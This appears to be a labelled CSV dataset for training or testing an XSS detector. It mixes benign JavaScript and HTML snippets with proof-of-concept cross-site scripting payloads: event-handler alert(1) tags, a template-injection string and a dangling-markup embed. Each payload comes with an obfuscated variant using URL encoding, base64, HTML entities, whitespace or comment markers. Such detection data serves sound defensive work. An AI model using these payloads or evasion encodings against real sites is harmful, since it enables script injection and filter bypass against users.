payload_original,payload_obfuscated,label,technique
_maybeenablecycle() { if (!this._config.ride) { return,_maybeenablecycle() { if (!this._config.ride) { return,0,none
"m.initializejquerywrapper(parallax, 'parallax', 'm_parallax')","m.initializejquerywrapper(parallax, 'parallax', 'm_parallax')",0,none
"var outevent = attachevent(""mouseout"", document.documentelement, documentleave, { handlenumbers: data.handlenumbers });","var outevent = attachevent(""mouseout"", document.documentelement, documentleave, { handlenumbers: data.handlenumbers });",0,none
switch (event.type) {,switch (event.type) {,0,none
"<dt onmousemove=""alert(1)"">test</dt>",&lt;dt onmousemove=&quot;alert(1)&quot;&gt;test&lt;/dt&gt;,1,html_entities
"<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />","<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />",0,none
$(this.modalel).remove(); this.destroyselects(); this.el.m_datepicker = undefined;,$(this.modalel).remove(); this.destroyselects(); this.el.m_datepicker = undefined;,0,none
"let offset = this.options.margin + this.options.transitionmovement; let edges = m.checkwithincontainer(document.body, bounding, offset); if (edges.left) {","let offset = this.options.margin + this.options.transitionmovement; let edges = m.checkwithincontainer(document.body, bounding, offset); if (edges.left) {",0,none
this._verticallyscrolling = false; anim.remove(this.el); anim.remove(this._overlay);,this._verticallyscrolling = false; anim.remove(this.el); anim.remove(this._overlay);,0,none
".on('click', this.done.bind(this)); confirmationbtnscontainer.appendto(this.footer); }",".on('click', this.done.bind(this)); confirmationbtnscontainer.appendto(this.footer); }",0,none
if (q >= g.currenttime) for (var g = 0,if (q >= g.currenttime) for (var g = 0,0,none
<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,%3Cmulticol%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Fmulticol%3E,1,urlencode
"<acronym ondblclick=""alert(1)"">test</acronym>",PGFjcm9ueW0gb25kYmxjbGljaz0iYWxlcnQoMSkiPnRlc3Q8L2Fjcm9ueW0+,1,base64
const data_api_key$2 = '.data-api'; const escape_key$1 = 'escape'; const event_hide$4 = `hide${event_key$4}`;,const data_api_key$2 = '.data-api'; const escape_key$1 = 'escape'; const event_hide$4 = `hide${event_key$4}`;,0,none
"<applet onmousemove=""alert(1)"">test</applet>",%3Capplet%20onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fapplet%3E,1,urlencode
"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>","<summary draggable=""  true""  ondragleave=""alert( 1)"">test</summary>",1,whitespace_noise
"<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b>","<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b>",0,none
"<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>","<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>",0,none
const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),0,none
return getwindowscroll(node); } else { return gethtmlelementscroll(node);,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,0,none
} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,0,none
"<del draggable=""true"" ondrag=""alert(1)"">test</del>","<del draggable=""true"" ondrag=""  alert(  1)"">test</del>",1,whitespace_noise
"return acc; }, {}); return object.keys(overflows).sort(function (a, b) {","return acc; }, {}); return object.keys(overflows).sort(function (a, b) {",0,none
} function getselectsingle_(el) { var selectedindex = el.selectedindex;,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,0,none
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;hr id=x style=&quot;position:absolute;&quot; onanimationcancel=&quot;alert(1)&quot;&gt;&lt;/hr&gt;,1,html_entities
"const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');","const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');",0,none
return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,0,none
const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',0,none
jqueryevent.preventdefault(); } return evt;,jqueryevent.preventdefault(); } return evt;,0,none
"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>","<style>:target {color:red;}</ style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del> ",1,whitespace_noise
"this._queuecallback(completecallback, this._element, true) } hide() {","this._queuecallback(completecallback, this._element, true) } hide() {",0,none
var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,0,none
} if (opts.isdisabled) { arr.push('is-disabled');,} if (opts.isdisabled) { arr.push('is-disabled');,0,none
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;noembed ondrop=alert(1) contenteditable&gt;drop here&lt;/noembed&gt;,1,html_entities
setoptions: function setoptions(setoptionsaction) {,setoptions: function setoptions(setoptionsaction) {,0,none
this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,0,none
prevmonth() { this.calendars[0].month--; this.adjustcalendars();,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,0,none
"</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>","</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>",0,none
if (expanded && parent !== expanded) { expanded.click() },if (expanded && parent !== expanded) { expanded.click() },0,none
"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",%3Ckbd%20oncut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fkbd%3E,1,urlencode
"<samp onclick=""alert(1)"">test</samp>",&lt;samp onclick=&quot;alert(1)&quot;&gt;test&lt;/samp&gt;,1,html_entities
this.$el.removeclass('focus'),this.$el.removeclass('focus'),0,none
if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,0,none
"k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;","k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;",0,none
{{$emit.constructor`alert(1)`()}},e3skZW1pdC5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKX19,1,base64
"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>","<legend onbeforecopy=""alert(1)"" contenteditable>test</legend/*OBF*/>",1,comment_marker
"<blockquote ondblclick=""alert(1)"">test</blockquote>","<blockquote ondblclick=""alert(1)  "">test</blockquote>",1,whitespace_noise
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>","<div draggable=""true"" contenteditable>drag/*OBF*/ me</d/*OBF*/iv><blockquote ondragover=alert(1) contenteditab/*OBF*/le>drop her/*OBF*/e</blockquote>",1,comment_marker
"<menu oncopy=""alert(1)"" contenteditable>test</menu>",%3Cmenu%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fmenu%3E,1,urlencode
index_js.execute(callback); return; },index_js.execute(callback); return; },0,none
<body onfocusout=alert(1) id=x><iframe id=x>,<  body onfocusout=  alert(1) id=x>< iframe id= x>,1,whitespace_noise
value: function _handletargetclick(e) { this.open(); },value: function _handletargetclick(e) { this.open(); },0,none
"<command onbeforecut=""alert(1)"" contenteditable>test</command>",%3Ccommand%20onbeforecut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fcommand%3E,1,urlencode
"<li onmouseup=""alert(1)"">test</li>",%3Cli%20onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,1,urlencode
if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,0,none
"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""","<embed src=http://subdomain1.portswigger-l/*OBF*/abs.net/dangling_markup/n/*OBF*/ame.html/*OBF*/ name=""",1,comment_marker
} }); var camelcase = (function () {,} }); var camelcase = (function () {,0,none
"}; var carousel = function (_component18) { _inherits(carousel, _component18);","}; var carousel = function (_component18) { _inherits(carousel, _component18);",0,none
<figcaption onpointerup=alert(1)>xss</figcaption>,<figcaption onpointerup= alert(  1)>xss</figcaption>,1,whitespace_noise
"}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];","}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];",0,none
let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,0,none
"<title onkeyup=""alert(1)"" contenteditable>test</title>",%3Ctitle%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Ftitle%3E,1,urlencode
"top: [this.options.endingtop, this.options.startingtop],","top: [this.options.endingtop, this.options.startingtop],",0,none
} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,0,none
value: function _handlefabclick() { if (this.isopen) { this.close();,value: function _handlefabclick() { if (this.isopen) { this.close();,0,none
"e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);","e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);",0,none
"<dd onmouseleave=""alert(1)"">test</dd>",%3Cdd%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fdd%3E,1,urlencode
"<style onkeydown=""alert(1)"" contenteditable>test</style>","<style onkeydown=""alert(1)"" contenteditable>test</style>  ",1,whitespace_noise
"} _handlecarouseldrag(e) { let x, y, delta, deltay;","} _handlecarouseldrag(e) { let x, y, delta, deltay;",0,none
var clickpos = timepicker._pos(e),var clickpos = timepicker._pos(e),0,none
"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>",0,none
"this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {","this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {",0,none
<svg><animate onend=alert(1) attributename=x dur=1s>,<svg><animate onend=alert(1) attributename=x dur=  1s>,1,whitespace_noise
<th id=x tabindex=1 onfocus=alert(1)></th>,<th id=x tabindex=1 onfocus=alert( 1)><  /th>,1,whitespace_noise
if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },0,none
<big onpointermove=alert(1)>xss</big>,<big onpointermove=alert(  1)>xss</  big>,1,whitespace_noise
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>","<div draggable="" true"" contenteditable>drag me< /div>  <dl ondragover=alert(  1) contenteditable>drop here</dl>",1,whitespace_noise
if ( value >= xval.slice(-1)[0] ){ return 100; },if ( value >= xval.slice(-1)[0] ){ return 100; },0,none
for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,0,none
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,%3Cwbr%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fwbr%3E%3Cinput%20autofocus%3E,1,urlencode
"} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);","} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);",0,none
config.parent = index_js.getelement(config.parent); return config; },config.parent = index_js.getelement(config.parent); return config; },0,none
